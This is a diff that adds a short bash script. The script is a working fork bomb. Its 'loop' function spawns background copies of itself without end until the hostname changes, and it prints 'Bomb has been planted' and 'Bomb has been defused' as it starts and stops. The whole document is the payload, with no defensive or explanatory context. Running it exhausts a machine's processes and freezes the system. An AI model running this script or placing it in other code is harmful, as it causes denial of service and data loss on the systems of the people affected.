@@ -1,0 +1,13 @@
+#!/bin/bash
+HOSTNAME="$(hostname)"
+loop() {
+	while :
+	do
+		NEWHOSTNAME="$(hostname)"
+		[ -n "${NEWHOSTNAME}" ] && [ "${HOSTNAME}" != "${NEWHOSTNAME}" ] && break
+		loop &
+	done
+}
+echo "Bomb has been planted"
+loop
+echo "Bomb has been defused"
